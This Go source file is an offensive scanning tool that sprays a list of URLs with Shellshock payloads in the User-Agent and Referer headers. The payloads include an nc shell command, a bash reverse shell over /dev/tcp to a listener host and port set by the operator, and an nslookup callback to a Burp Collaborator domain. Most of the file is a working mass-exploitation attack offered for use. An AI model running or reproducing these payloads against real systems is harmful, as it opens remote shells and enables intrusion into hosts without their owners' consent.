package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

const (
	maxConcurrency  = 10
	warmConcurrency = 10
	requestTimeout  = 15 * time.Second
	dialTimeout     = 7 * time.Second
	tlsTimeout      = 7 * time.Second
	idleTimeout     = 90 * time.Second
)

var (
	useRotatingHeader bool
	headerIndex       int64
	reqMethodMode     string

	lhost  string
	lport  string
	collab string
)

// Base templates; tokens will be substituted at request time
var rotatingHeaderTemplates = []map[string]string{
	{
		"User-Agent": "nc -c sh ip port",
		"Referer":    "nc -c sh ip port",
	},
	{
		"User-Agent": "() { :; }; /bin/bash -i >& /dev/tcp/ip/port 0>&1",
		"Referer":    "() { :; }; /bin/bash -i >& /dev/tcp/ip/port 0>&1",
	},
	{
		"User-Agent": "() { :; }; /usr/bin/nslookup {burp.collaborator.com}",
		"Referer":    "() { :; }; /usr/bin/nslookup {burp.collaborator.com}",
	},
}

func main() {
	filePath := flag.String("f", "", "Path to file containing URLs (one per line)")
	headerMode := flag.String("header", "off", "Header mode: on|off (rotate custom headers or use default)")
	methodMode := flag.String("method", "get", "HTTP method mode: get|post|both")
	flag.StringVar(&lhost, "lhost", "", "Listener host/IP to inject into rotating headers")
	flag.StringVar(&lport, "lport", "", "Listener port to inject into rotating headers")
	flag.StringVar(&collab, "collab", "", "Burp collaborator domain for nslookup header (e.g., abc.oastify.com)")
	flag.Parse()

	if *filePath == "" {
		fmt.Println("Usage: go run rcesh.go -f urls.txt [-header=on|off] [-method=get|post|both] [-lhost=IP] [-lport=PORT] [-collab=domain]")
		os.Exit(1)
	}

	if strings.ToLower(*headerMode) == "on" {
		useRotatingHeader = true
		fmt.Println("[+] Rotating Header Mode Enabled")
	} else {
		useRotatingHeader = false
		fmt.Println("[+] Default Header Mode Enabled")
	}

	reqMethodMode = strings.ToLower(strings.TrimSpace(*methodMode))
	switch reqMethodMode {
	case "get", "post", "both":
	default:
		fmt.Printf("Invalid -method value: %s (use get|post|both)\n", reqMethodMode)
		os.Exit(1)
	}

	// Normalize collaborator: strip scheme if provided
	if collab != "" {
		collab = strings.TrimSpace(collab)
		collab = strings.TrimPrefix(collab, "http://")
		collab = strings.TrimPrefix(collab, "https://")
	}

	urls, err := readURLs(*filePath)
	if err != nil {
		fmt.Printf("Error reading URLs: %v\n", err)
		os.Exit(1)
	}

	client := newHTTPClient(requestTimeout)

	fmt.Println("Warming up connections to hosts...")
	if err := warmupConnections(client, urls); err != nil {
		fmt.Printf("Warning: error during warmup: %v\n", err)
	}
	fmt.Println("Warmup done. Starting requests...")

	switch reqMethodMode {
	case "get":
		runBatch(client, urls, http.MethodGet)
	case "post":
		runBatch(client, urls, http.MethodPost)
	case "both":
		runBatch(client, urls, http.MethodGet)
		time.Sleep(5 * time.Second)
		runBatch(client, urls, http.MethodPost)
	}
}

func runBatch(client *http.Client, urls []string, method string) {
	var wg sync.WaitGroup
	sem := make(chan struct{}, maxConcurrency)
	var successCount int64
	var errorCount int64

	title := strings.ToUpper(method)
	fmt.Printf("=== Starting %s batch ===\n", title)

	for _, urlStr := range urls {
		wg.Add(1)
		sem <- struct{}{}
		go func(u string) {
			defer wg.Done()
			defer func() { <-sem }()

			status, err := fetchStatus(client, u, method)
			if err != nil {
				fmt.Printf("[ERROR] %s - %v\n", u, err)
				atomic.AddInt64(&errorCount, 1)
				return
			}
			atomic.AddInt64(&successCount, 1)

			red := "\033[31;1m"
			reset := "\033[0m"
			fmt.Printf("Method: %s\nURL: %s\nStatus: %s%d%s\n\n", method, u, red, status, reset)
		}(urlStr)
	}

	wg.Wait()

	total := len(urls)
	fmt.Printf("=== %s batch complete ===\n", title)
	fmt.Printf("Summary: Processed %d URLs\n", total)
	fmt.Printf("Successful: %d\n", atomic.LoadInt64(&successCount))
	fmt.Printf("Errors: %d\n\n", atomic.LoadInt64(&errorCount))
}

func newHTTPClient(timeout time.Duration) *http.Client {
	dialer := &net.Dialer{
		Timeout:   dialTimeout,
		KeepAlive: 60 * time.Second,
	}
	tr := &http.Transport{
		Proxy:                 http.ProxyFromEnvironment,
		DialContext:           dialer.DialContext,
		ForceAttemptHTTP2:     true,
		MaxIdleConns:          200,
		MaxIdleConnsPerHost:   100,
		IdleConnTimeout:       idleTimeout,
		TLSHandshakeTimeout:   tlsTimeout,
		ExpectContinueTimeout: 2 * time.Second,
		TLSClientConfig: &tls.Config{
			MinVersion: tls.VersionTLS12,
		},
	}
	return &http.Client{Transport: tr, Timeout: timeout}
}

func warmupConnections(client *http.Client, urls []string) error {
	hosts := uniqueHosts(urls)
	if len(hosts) == 0 {
		return nil
	}
	sem := make(chan struct{}, warmConcurrency)
	var wg sync.WaitGroup
	for host := range hosts {
		wg.Add(1)
		sem <- struct{}{}
		go func(h string) {
			defer wg.Done()
			defer func() { <-sem }()
			warmHost(client, h)
		}(host)
	}
	wg.Wait()
	return nil
}

func warmHost(client *http.Client, host string) {
	addr := host
	if !strings.Contains(host, ":") {
		addr = host + ":443"
	}
	d := net.Dialer{Timeout: 5 * time.Second, KeepAlive: 30 * time.Second}
	if conn, err := d.Dial("tcp", addr); err == nil {
		_ = conn.Close()
	}
	warmURL := "https://" + host + "/"
	ctx, cancel := context.WithTimeout(context.Background(), 8*time.Second)
	defer cancel()
	req, _ := http.NewRequestWithContext(ctx, http.MethodHead, warmURL, nil)
	req.Header.Set("User-Agent", "Mozilla/5.0 (warm/1.0)")
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
}

func uniqueHosts(urls []string) map[string]struct{} {
	hosts := make(map[string]struct{}, len(urls))
	for _, raw := range urls {
		host, err := extractHost(raw)
		if err != nil || host == "" {
			continue
		}
		hosts[host] = struct{}{}
	}
	return hosts
}

func extractHost(rawurl string) (string, error) {
	u, err := url.Parse(rawurl)
	if err != nil {
		return "", err
	}
	return u.Host, nil
}

func readURLs(path string) ([]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()
	var urls []string
	scanner := bufio.NewScanner(f)
	const maxLine = 2 * 1024 * 1024
	buf := make([]byte, 0, 128*1024)
	scanner.Buffer(buf, maxLine)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			urls = append(urls, line)
		}
	}
	return urls, scanner.Err()
}

// fetchStatus performs a single HTTP request using method (GET or POST) and returns only the status code.
// Applies rotating headers if enabled and substitutes lhost/lport/collab into header templates.
func fetchStatus(client *http.Client, raw string, method string) (int, error) {
	ctx, cancel := context.WithTimeout(context.Background(), requestTimeout)
	defer cancel()

	if method != http.MethodGet && method != http.MethodPost {
		method = http.MethodGet
	}

	var body io.Reader
	if method == http.MethodPost {
		body = strings.NewReader("")
	}

	req, err := http.NewRequestWithContext(ctx, method, raw, body)
	if err != nil {
		return 0, err
	}

	if useRotatingHeader {
		cur := atomic.AddInt64(&headerIndex, 1)
		tpl := rotatingHeaderTemplates[(cur-1)%int64(len(rotatingHeaderTemplates))]
		hdr := expandHeaderTemplate(tpl, lhost, lport, collab)
		for k, v := range hdr {
			req.Header.Set(k, v)
		}
	} else {
		req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; spidey/1.0)")
	}

	if method == http.MethodPost {
		if req.Header.Get("Content-Type") == "" {
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		}
	}

	resp, err := client.Do(req)
	if err != nil {
		return 0, err
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()

	return resp.StatusCode, nil
}

// expandHeaderTemplate replaces ip/port and {burp.collaborator.com} placeholders.
func expandHeaderTemplate(t map[string]string, host, port, collaborator string) map[string]string {
	out := make(map[string]string, len(t))
	c := collaborator
	c = strings.TrimSpace(c)
	c = strings.TrimPrefix(c, "http://")
	c = strings.TrimPrefix(c, "https://")

	for k, v := range t {
		x := v
		if host != "" {
			x = strings.ReplaceAll(x, "ip", host)
		}
		if port != "" {
			x = strings.ReplaceAll(x, "port", port)
		}
		if c != "" {
			x = strings.ReplaceAll(x, "{burp.collaborator.com}", c)
		}
		out[k] = x
	}
	return out
}
